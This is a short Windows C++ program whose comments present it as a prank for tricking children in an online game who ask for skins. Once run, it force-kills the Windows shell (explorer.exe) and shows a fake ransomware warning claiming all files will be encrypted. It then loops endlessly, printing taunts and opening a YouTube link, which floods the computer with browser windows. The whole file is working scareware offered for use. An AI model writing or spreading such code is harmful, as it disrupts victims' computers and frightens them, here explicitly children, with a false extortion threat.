#include <stdio.h>                         
#include <string.h>
#include <fstream>
#include <Windows.h>
#include <shellapi.h>
#include <iostream>

//This is harmless, but to the 9 year old in rift, their pc is fucked.
//Dont use this to harm anyone. Just to troll children :D

bool bDeveloper = false;

void SpamShit()
{
	std::cout << "GET FUCKED LMFAOO\n";
	std::cout << "NEXT TIME DON'T ASK FOR SKINS\n";
	ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
}

int main()
{
	system("Color 0C");

	if (!bDeveloper)
		system("taskkill /IM explorer.exe /F");

	if (!bDeveloper)
		MessageBoxA(nullptr, "Your Computer is Infected. If you close this window, all your files will be Encrypted. Press OK to enjoy the last 5 minutes of your pc ;)", "skīñś", MB_OK);

	if (bDeveloper)
		SpamShit();
	else
	{
	LoadShit:
		SpamShit();
		goto LoadShit;
	}

	return 0;
}
